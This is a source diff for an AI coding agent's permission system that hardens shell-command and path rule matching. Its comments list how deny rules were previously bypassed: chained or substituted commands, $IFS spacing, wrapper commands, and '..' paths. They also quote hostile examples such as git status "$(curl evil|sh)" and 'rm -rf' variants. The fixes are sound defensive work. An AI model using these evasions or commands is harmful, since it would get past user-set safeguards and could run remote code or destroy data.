@@ -19,6 +19,8 @@
 
 
 import { loadSettings, saveSettings } from "../state/storage.js";
+import { loadProjectPermissions } from "../utils/config.js";
+import { PATH_INPUT_KEYS } from "../utils/toolUtils.js";
 
 export type PermissionBehavior = "allow" | "deny" | "ask";
 
@@ -225,9 +227,17 @@ export function globToRegex(pattern: string, workingDir?: string): RegExp {
 
   
   
-  const anchored = workingDir && !pattern.startsWith("/") && !pattern.startsWith("~")
-    ? `${escapeRegex(stripTrailingSlash(workingDir))}[\\/\\\\]${re}`
-    : re;
+  // A relative pattern is anchored to the working directory, because that is
+  // the only thing that makes it a location. The separator belongs to the
+  // anchor: at the filesystem root the base *is* the separator, so `/` must not
+  // be doubled into `//`.
+  const base = workingDir ? escapeRegex(stripTrailingSlash(workingDir)) : "";
+  const anchored =
+    workingDir && !pattern.startsWith("/") && !pattern.startsWith("~")
+      ? base === "/"
+        ? `\\/${re}`
+        : `${base}[\\/\\\\]${re}`
+      : re;
 
   return new RegExp(`^${anchored}$`, "s");
 }
@@ -271,6 +281,233 @@ export function matchShellCommand(pattern: string, command: string): boolean {
 
   
   return cmd === pat;
+}
+
+
+/**
+ * Split a shell command into the subcommands that will actually run, and report
+ * whether that split can be trusted.
+ *
+ * RB-1: before this existed, a rule was matched against the whole command
+ * string, so `Bash(git:*)` auto-approved `git status && rm -rf /tmp/evil` and a
+ * `Bash(rm:*)` deny never fired behind `&&`/`;`/`|`. Splitting on the operators
+ * and evaluating each subcommand is what makes both directions sound.
+ *
+ * `simple` is false when the command contains constructs whose runtime effect
+ * cannot be modelled statically (command substitution, backticks — including
+ * inside double quotes, where the shell still expands them — process
+ * substitution, grouping, backgrounding, unbalanced quotes). Callers must fail
+ * safe on those rather than guess.
+ */
+export function splitShellCommand(command: string): { simple: boolean; parts: string[] } {
+  const parts: string[] = [];
+  let current = "";
+  let quote: '"' | "'" | null = null;
+  let simple = true;
+
+  for (let i = 0; i < command.length; i++) {
+    const c = command[i] as string;
+
+    if (quote) {
+      current += c;
+      if (c === "\\" && quote === '"' && i + 1 < command.length) {
+        current += command[++i] as string;
+        continue;
+      }
+      // Inside DOUBLE quotes the shell still expands `$(...)` and backticks, so
+      // a quoted substitution runs a command the prefix match never saw:
+      // `Bash(git status:*)` would vouch for `git status "$(curl evil|sh)"`.
+      // Single quotes are literal, and an escaped `\$(`/`\`` is literal too —
+      // both are handled above and correctly stay analysable.
+      if (quote === '"' && (c === "`" || (c === "$" && command[i + 1] === "("))) {
+        simple = false;
+      }
+      if (c === quote) quote = null;
+      continue;
+    }
+
+    if (c === '"' || c === "'") {
+      quote = c;
+      current += c;
+      continue;
+    }
+
+    if (c === "\\") {
+      current += c;
+      if (i + 1 < command.length) current += command[++i] as string;
+      continue;
+    }
+
+    // Constructs we cannot reason about: the real command may be produced at
+    // runtime, so no static split can be complete. Each one is a boundary
+    // between commands, so the part is closed here rather than glued to its
+    // neighbours.
+    //
+    // Gluing is what made an explicit deny miss: `git status; (rm -rf X)`
+    // came back as one part `(rm -rf X)`, which matches no rule written for
+    // `rm`, and the fallback below — matching the whole raw string — did not
+    // either. Deny and ask consult these parts, so a construct that cannot be
+    // modelled now yields the command inside it instead of hiding it.
+    if (c === "`") { simple = false; parts.push(current); current = ""; continue; }
+    if (c === "$" && command[i + 1] === "(") { simple = false; parts.push(current); current = ""; i++; continue; }
+    if ((c === "<" || c === ">") && command[i + 1] === "(") { simple = false; parts.push(current); current = ""; i++; continue; }
+    if (c === "(" || c === ")" || c === "!") {
+      simple = false;
+      parts.push(current);
+      current = "";
+      continue;
+    }
+    // Braces are NOT a split point: `${HOME}` is a parameter expansion whose
+    // path the dangerous-command check has to read whole — cutting it into `$`
+    // and `HOME` stops `rm -rf ${HOME}` being recognised as the delete it is.
+    // Brace *grouping* (`{ rm -rf X; }`) needs no help here, because the `;`
+    // inside it already splits.
+    if (c === "{" || c === "}") simple = false;
+
+    // `${IFS}` and `$IFS` expand to whitespace, so `rm${IFS}-rf${IFS}/tmp/x`
+    // is `rm -rf /tmp/x` to the shell — matched literally it names no command
+    // at all, and a `Bash(rm:*)` deny walked straight past it. Expand to a
+    // space. The spelling still varies with the environment, so the result is
+    // not analysable and may never auto-allow.
+    if (c === "$") {
+      const braced = command.startsWith("{IFS}", i + 1);
+      const bare =
+        !braced &&
+        command.startsWith("IFS", i + 1) &&
+        !/[A-Za-z0-9_]/.test(command[i + 4] ?? "");
+      if (braced || bare) {
+        simple = false;
+        current += " ";
+        i += braced ? 5 : 3;
+        continue;
+      }
+    }
+
+    if (c === "\n" || c === ";") {
+      parts.push(current);
+      current = "";
+      continue;
+    }
+
+    if (c === "&" || c === "|") {
+      const next = command[i + 1];
+      if (next === "&" || next === "|") {
+        parts.push(current);
+        current = "";
+        i++;
+        continue;
+      }
+      // A lone `&` backgrounds the command; a lone `|` pipes into the next.
+      if (c === "&") simple = false;
+      parts.push(current);
+      current = "";
+      continue;
+    }
+
+    current += c;
+  }
+
+  if (quote) simple = false;
+  parts.push(current);
+
+  const cleaned = parts.map((p) => p.trim()).filter((p) => p.length > 0);
+  if (cleaned.length === 0) simple = false;
+  return { simple, parts: cleaned };
+}
+
+/** Wrapper commands that exec their arguments as the command to run. Leading
+ *  ones are stripped before a deny or ask rule is matched, so `nice rm -rf X`
+ *  is seen as what it is. Over-stripping is the safe direction here — it makes
+ *  an explicit deny fire more often, and a rule naming a wrapper itself rather
+ *  than what it wraps is vanishingly rare. */
+const WRAPPER_RES = [
+  // `timeout 5 cmd`, `timeout --kill-after=5 10s cmd`
+  /^timeout(?:[ \t]+--?[A-Za-z-]+=[^ \t]+)*[ \t]+(?:--[ \t]+)?\d+(?:\.\d+)?[smhd]?[ \t]+/,
+  /^time(?:[ \t]+--)?[ \t]+/,
+  /^nice(?:[ \t]+-n[ \t]+-?\d+|[ \t]+-\d+)?[ \t]+/,
+  /^stdbuf(?:[ \t]+-[ioe][LN0-9]+)*[ \t]+/,
+  /^(?:nohup|command|env|exec|builtin)[ \t]+/,
+] as const;
+
+/** An env assignment in front of a command: `FOO=1 rm -rf X` runs `rm`.
+ *  Distinct from ENV_ASSIGN_RE below, which matches a whole token. */
+const LEADING_ENV_ASSIGN_RE = /^[A-Za-z_][A-Za-z0-9_]*=[^ \t]*[ \t]+/;
+
+/**
+ * Peel the shell decoration off a subcommand so a rule written for the command
+ * itself matches it: the separators and subshell punctuation the split leaves
+ * on either end, a leading env assignment, and any leading wrapper.
+ *
+ * Quotes are deliberately not peeled. `echo "rm -rf X"` is not a call to `rm`,
+ * and stripping the quotes to find one would turn every harmless mention of a
+ * denied command into a denial.
+ */
+export function stripShellDecoration(part: string): string {
+  let s = part.trim();
+  for (;;) {
+    const before = s;
+    s = s.replace(/^[;&|`(){}$!]+/, "");
+    s = s.replace(LEADING_ENV_ASSIGN_RE, "");
+    for (const re of WRAPPER_RES) s = s.replace(re, "");
+    s = s.replace(/[\s)}`]+$/, "");
+    s = s.trim();
+    if (s === before) return s;
+  }
+}
+
+/**
+ * Match one shell rule against a command, per subcommand (RB-1).
+ *
+ * - allow: fires only when the command is fully analysable AND every
+ *   subcommand matches. A rule that covers `git` alone must not vouch for what
+ *   is chained after it.
+ * - deny/ask: fires when ANY subcommand matches.
+ * - Unanalysable commands never auto-allow. For deny/ask they are matched
+ *   against every subcommand the splitter could still find, in raw and
+ *   decoration-stripped form, on top of the whole string.
+ *
+ * The last point is load-bearing. The splitter cannot model command
+ * substitution, grouping, backgrounding and the wrapper commands, and the
+ * whole-string match alone almost never fires — a rule for `rm` does not match
+ * a string that starts with `git status`. So "cannot model" was not a refusal
+ * to guess, it was a hole: every one of
+ *
+ *     git status & rm -rf X      git status; (rm -rf X)
+ *     git status; $(rm -rf X)    git status; `rm -rf X`
+ *     ! rm -rf X                 FOO=1 rm -rf X
+ *     nice rm -rf X              command rm -rf X
+ *     rm${IFS}-rf${IFS}X
+ *
+ * ran the command with an explicit `Bash(rm:*)` deny in settings and no prompt
+ * to the user. Denying on the parts the splitter did find, and on those parts
+ * with their decoration peeled, closes all nine. Constructs that still defeat
+ * this — `eval "rm -rf X"`, `sh -c "rm -rf X"` — need the command actually
+ * resolved, which is the reference's AST pass and is not attempted here.
+ */
+export function matchShellRule(
+  pattern: string,
+  command: string,
+  behavior: PermissionBehavior,
+): boolean {
+  const { simple, parts } = splitShellCommand(command);
+  if (simple) {
+    if (behavior === "allow") {
+      // Deliberately no decoration-stripping on the allow side: `nice rm -rf X`
+      // is not obviously the command a `Bash(rm:*)` rule vouched for, and the
+      // cost of being wrong is an unapproved execution. It falls to a prompt.
+      return parts.length > 0 && parts.every((p) => matchShellCommand(pattern, p));
+    }
+    return parts.some((p) => matchShellCommand(pattern, p) || matchesStripped(pattern, p));
+  }
+  if (behavior === "allow") return false;
+  if (matchShellCommand(pattern, command)) return true;
+  return parts.some((p) => matchShellCommand(pattern, p.trim()) || matchesStripped(pattern, p));
+}
+
+/** The pattern, against a subcommand with its shell decoration peeled off. */
+function matchesStripped(pattern: string, part: string): boolean {
+  const stripped = stripShellDecoration(part);
+  return stripped.length > 0 && matchShellCommand(pattern, stripped);
 }
 
 
@@ -369,10 +606,7 @@ function extractSubjects(
   
   
   
-  const concretePaths = pickStrings(
-    input,
-    ["file_path", "path", "notebook_path"],
-  );
+  const concretePaths = pickStrings(input, [...PATH_INPUT_KEYS]);
   if (concretePaths.length > 0) {
     return {
       kind: "path",
@@ -426,19 +660,25 @@ function resolveAgainst(workingDir: string, p: string): string {
 
 
 function canonicalize(p: string): string {
+  const isAbsolute = p.startsWith("/");
   const parts = p.split("/");
   const out: string[] = [];
   for (const seg of parts) {
-    if (seg === "." || seg === "") {
-      
-      
-      if (out.length === 0 && seg === "") out.push("");
+    if (seg === "." || seg === "") continue;
+    if (seg === "..") {
+      // RB-2: `..` must be collapsed lexically. Leaving it in the subject let a
+      // deny rule for /a/b/c be evaded with /a/b/../c — the same real file, a
+      // different string — and the deny degraded to "ask" (which headless
+      // auto-approves). Never pop past the root, and keep leading `..` on a
+      // relative path since those are genuinely outside the base.
+      if (out.length > 0 && out[out.length - 1] !== "..") out.pop();
+      else if (!isAbsolute) out.push("..");
       continue;
     }
     out.push(seg);
   }
-  let joined = out.join("/");
-  if (joined.length > 1 && joined.endsWith("/")) joined = joined.slice(0, -1);
+  const joined = out.join("/");
+  if (isAbsolute) return joined ? `/${joined}` : "/";
   return joined || ".";
 }
 
@@ -462,14 +702,21 @@ export function matchToolInput(
 
   for (const v of values) {
     if (kind === "shell") {
-      if (matchShellCommand(pat, v)) return true;
+      if (matchShellRule(pat, v, rule.behavior)) return true;
     } else if (kind === "path") {
 
+      // `~` is expanded here so the pattern is absolute and stops looking
+      // relative; everything else is handed to the matcher as written, with
+      // the working directory passed along so a relative rule is anchored to
+      // it. Subjects are always absolute (extractSubjects resolves them), so
+      // without that argument `deny: ["Edit(.git/**)"]` compiled to
+      // `^\.git[/\\](?:.*)$` and matched nothing — a security rule that fails
+      // open and reports nothing.
       const expandedPat =
         pat === "~" || pat.startsWith("~/")
           ? resolveAgainst(workingDir, pat)
           : pat;
-      if (matchGlob(expandedPat, v)) return true;
+      if (matchGlob(expandedPat, v, workingDir)) return true;
     } else if (kind === "domain") {
       // Rule content is "domain:<host>" (optionally a wildcard like "*.example.com").
       const domain = pat.startsWith("domain:") ? pat.slice("domain:".length) : pat;
@@ -568,6 +815,12 @@ function ruleReason(rule: ParsedRule, behavior: PermissionBehavior): string {
 
 
 
+export interface PermissionSettings {
+  allow?: readonly string[];
+  deny?: readonly string[];
+  ask?: readonly string[];
+}
+
 export function parsePermissionSettings(permissions: {
   allow?: readonly string[];
   deny?: readonly string[];
@@ -578,6 +831,57 @@ export function parsePermissionSettings(permissions: {
     ...parseRules(permissions.ask ?? [], "ask"),
     ...parseRules(permissions.deny ?? [], "deny"),
   ];
+}
+
+/**
+ * Union of the rule sets that govern a tool call.
+ *
+ * Concatenated rather than overridden, because `matchDecision` resolves by
+ * behavior first — deny, then ask, then allow — so a deny in either set beats
+ * an allow in the other. That direction is the one that matters: `allow:
+ * ["Bash"]` in a workspace config must not lift a deny the user wrote.
+ *
+ * Duplicates are dropped per behavior: the same rule in both scopes is one
+ * rule. An allow and a deny that read alike are not duplicates and both stay.
+ */
+export function mergePermissions(
+  ...sets: readonly (PermissionSettings | null | undefined)[]
+): PermissionSettings {
+  const out: { allow: string[]; ask: string[]; deny: string[] } = { allow: [], ask: [], deny: [] };
+  for (const set of sets) {
+    if (!set) continue;
+    for (const behavior of ["allow", "ask", "deny"] as const) {
+      for (const rule of set[behavior] ?? []) {
+        if (typeof rule === "string" && rule.trim() && !out[behavior].includes(rule)) {
+          out[behavior].push(rule);
+        }
+      }
+    }
+  }
+  return out;
+}
+
+/**
+ * Every rule that governs this workspace right now: the user's settings, plus
+ * the workspace's own config when the workspace is trusted.
+ *
+ * The workspace half used to be written and never read. `/permissions` offered
+ * a "Project settings" destination that stored rules in `.deepseek-code.json`,
+ * so a project deny rule — the security-relevant case, the one a team writes to
+ * protect a directory — was saved, displayed as saved, and enforced nothing.
+ *
+ * Callers must pass the directory rules are matched against: it is the same
+ * directory the workspace config lives in, and the same one the trust decision
+ * is made about.
+ */
+export function loadEffectivePermissions(dir: string = process.cwd()): PermissionSettings {
+  let user: PermissionSettings | undefined;
+  try {
+    user = loadSettings().permissions;
+  } catch {
+    // Unreadable user settings are no reason to drop the workspace's rules.
+  }
+  return mergePermissions(user, loadProjectPermissions(dir));
 }
 
 /* ------------------------------------------------------------------ */
